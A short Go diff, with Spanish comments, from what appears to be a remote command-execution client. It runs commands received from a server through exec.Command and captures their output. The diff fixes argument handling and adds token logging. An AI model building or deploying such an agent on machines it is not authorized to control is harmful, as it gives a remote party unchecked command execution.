@@ -45,11 +45,16 @@ func main() {
 			log.Debug("[+] Comando recibido del servidor.", "CMD", cmd.In)
 		}
 		tokens := strings.Split(cmd.In, " ")
+
+		log.Info("Tokens", "Token", tokens)
+		for token := range tokens {
+			log.Info("Tokens", "token", tokens[token])
+		}
 		var c *exec.Cmd
 		if len(tokens) == 1 {
 			c = exec.Command(tokens[0])
 		} else if len(tokens) >= 1 {
-			c = exec.Command(tokens[0], tokens[:1]...)
+			c = exec.Command(tokens[0], tokens[1:]...)
 		}
 		// Cambiar en un futuro a stderr y stdout
 		buf, err := c.CombinedOutput()
